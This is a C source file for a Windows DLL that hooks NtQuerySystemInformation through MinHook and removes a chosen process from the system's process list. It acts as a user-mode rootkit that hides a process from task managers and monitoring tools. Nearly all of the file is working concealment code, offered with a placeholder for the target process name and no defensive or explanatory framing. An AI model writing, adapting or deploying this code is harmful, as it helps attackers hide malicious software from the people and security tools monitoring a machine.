#include "prochider.h"
#include "MinHook.h"
#include <wchar.h>

PNT_QUERY_SYSTEM_INFORMATION fpNtQuerySystemInformation = NULL;
const wchar_t* g_ProcessName = NULL; // write here the name of the process that needs to be hidden (important)

BOOL IsTargetProcess(UNICODE_STRING ImageName) {
    if (ImageName.Buffer == NULL || ImageName.Length == 0) {
        return FALSE;
    }

    if (_wcsicmp(ImageName.Buffer, g_ProcessName) == 0) {
        return TRUE;
    }

    return FALSE;
}

NTSTATUS WINAPI DetourNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status = fpNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );

    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {
        SYSTEM_PROCESS_INFORMATION* pCurrent = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
        SYSTEM_PROCESS_INFORMATION* pNext = NULL;

        while (TRUE) {
            if (pCurrent->NextEntryOffset == 0) break;

            pNext = (SYSTEM_PROCESS_INFORMATION*)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

            if (IsTargetProcess(pNext->ImageName)) {
                if (pNext->NextEntryOffset == 0) {
                    pCurrent->NextEntryOffset = 0;
                } else {
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                }
            } else {
                pCurrent = pNext;
            }
        }
    }

    return status;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:

        if (MH_Initialize() != MH_OK) {
            return FALSE;
        }

        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) return FALSE;

        FARPROC pOriginal = GetProcAddress(hNtdll, "NtQuerySystemInformation");
        if (!pOriginal) return FALSE;

        if (MH_CreateHook(pOriginal, &DetourNtQuerySystemInformation, (LPVOID*)&fpNtQuerySystemInformation) != MH_OK) {
            return FALSE;
        }

        if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK) {
            return FALSE;
        }
        break;

    case DLL_PROCESS_DETACH:
        MH_DisableHook(MH_ALL_HOOKS);
        MH_Uninitialize();
        break;
    }
    return TRUE;
}
